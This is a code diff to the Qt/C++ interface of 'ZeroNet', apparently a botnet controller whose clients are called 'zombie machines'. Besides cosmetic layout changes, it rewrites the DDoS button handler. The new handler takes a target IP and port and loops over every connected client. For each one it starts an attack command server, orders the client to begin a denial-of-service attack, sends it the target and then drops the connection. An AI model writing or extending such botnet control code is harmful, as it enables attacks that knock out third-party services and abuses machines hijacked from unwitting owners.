@@ -13,7 +13,7 @@ Widget::Widget(QWidget *parent) :
     this->setWindowTitle("ZeroNet");
 
     // 设置窗口大小
-    const int w = 750,  h = 500;
+    const int w = 760,  h = 500;
     // 将窗口至中，你必须在widget.h里#include <QDesktopWidget>
     // 以后我就不再多说了，没有include的类就自己在.h文件里include
     const int x = (QApplication::desktop()->width() - w)/2;
@@ -49,9 +49,17 @@ Widget::Widget(QWidget *parent) :
 
     //添加一个拒绝服务攻击（DDOS）功能图标
     QPushButton *btddos = new QPushButton(QIcon(":/resources/ddos.png"),"拒绝服务攻击", this);
-    btddos->setIconSize(QSize(60,60));
+    btddos->setIconSize(QSize(70,60));
     connect(btddos, SIGNAL(clicked(bool)), this, SLOT(cmdDdosClicked()));
-    btddos->setGeometry(4*150,0,150, 100);
+    btddos->setGeometry(4*150,0,160, 100);
+
+//    //DDOS目标设置
+//    QLabel *lbDdos = new QLabel("攻击IP:",this);
+//    lbDdos->setGeometry(610,130,60,30);
+//    mEditDdos = new QLineEdit(this);
+//    mEditDdos->setText("127.0.0.1");
+//    mEditDdos->setMaxLength(80);
+//    mEditDdos->setGeometry(660,130,70,30);
 
     // 设置QTableWiget来存放上线客户的信息
     mClientTable = new QTableWidget(this);
@@ -99,13 +107,6 @@ Widget::Widget(QWidget *parent) :
 
     // 服务器控制控件
 
-    //DDOS目标设置
-    QLabel *lbDdos = new QLabel("攻击IP:",this);
-    lbDdos->setGeometry(610,130,60,30);
-    mEditDdos = new QLineEdit(this);
-    mEditDdos->setText("127.0.0.1");
-    mEditDdos->setMaxLength(80);
-    mEditDdos->setGeometry(660,130,70,30);
 
     // 域名设置
     QLabel *lbDomain =  new QLabel("域名:", this);
@@ -113,7 +114,7 @@ Widget::Widget(QWidget *parent) :
     mEditDomain = new QLineEdit(this);
     mEditDomain->setText("127.0.0.1");
     mEditDomain->setMaxLength(80);
-    mEditDomain->setGeometry(660,330,70,30);
+    mEditDomain->setGeometry(660,330,80,30);
 
     // 端口设置
     QLabel *lbPort=  new QLabel("端口:", this);
@@ -121,16 +122,16 @@ Widget::Widget(QWidget *parent) :
     mEditPort = new QLineEdit(this);
     mEditPort->setText("18000");
     mEditPort->setValidator(new QIntValidator(1,65535));
-    mEditPort->setGeometry(660,370,70,30);
+    mEditPort->setGeometry(660,370,80,30);
 
     // 开始服务端
     mBtStartServer = new QPushButton("开启服务端",this);
     connect(mBtStartServer, SIGNAL(clicked(bool)), this, SLOT(startServer()));
-    mBtStartServer->setGeometry(630,410, 100,30);
+    mBtStartServer->setGeometry(630,410, 110,30);
     // 创建客户端
     QPushButton *btCreateClient = new QPushButton("创建客户端",this);
     connect(btCreateClient, SIGNAL(clicked(bool)), this, SLOT(createClient()));
-    btCreateClient->setGeometry(630,450, 100,30);
+    btCreateClient->setGeometry(630,450, 110,30);
 
     // 初始化服务端
     mZeroServer = new ZeroServer(this);
@@ -198,28 +199,39 @@ void Widget::cmdSpyClicked()
 
 void Widget::cmdDdosClicked()
 {
-    int id = mClientTable->rowCount();
+
+       int id = mClientTable->rowCount();
     if (id != 0)
     {
+
+        DdosSpy *Ddosinformation=new DdosSpy();
+        QString IP=Ddosinformation->getIP();
+        int PORT=Ddosinformation->getPORT();
+        qDebug()<<IP<<PORT;
+
         for(int ddosid=1 ; ddosid <= id ; ddosid++)
         {
-            DdosSpy *ds= new DdosSpy();
+            DdosATK *ds= new DdosATK();
             ZeroClient *client = mZeroServer->client(ddosid);
-            int port = ds->startDdosSpyServer(QString::number(ddosid));
+            //返回新的服务端端口(用于发送命令)
+            int port = ds->startDdosATKServer(/*QString::number(ddosid)*/);
 
             //开始DDOS
             client->sendDdosSpy(port);
-
-            //发送目标IP地址
-            QString ATK_IP=mEditDdos->text();
-            ds->sendCommand(ATK_IP);
+            //发送攻击目标IP和端口
+            ds->sendCommand(IP,PORT);
+            //断开客户？？？？
+            client->closeAndDelete();
         }
     }
     else
     {
-        qDebug() << "DDOS 需要肉鸡的，亲";
+        QMessageBox::information(this,"Fail","DDOS 需要肉鸡的，亲");
+        qDebug() << "DDOS 需要肉鸡的,亲";
     }
 }
+
+
 
 void Widget::sendMessageClicked()
 {
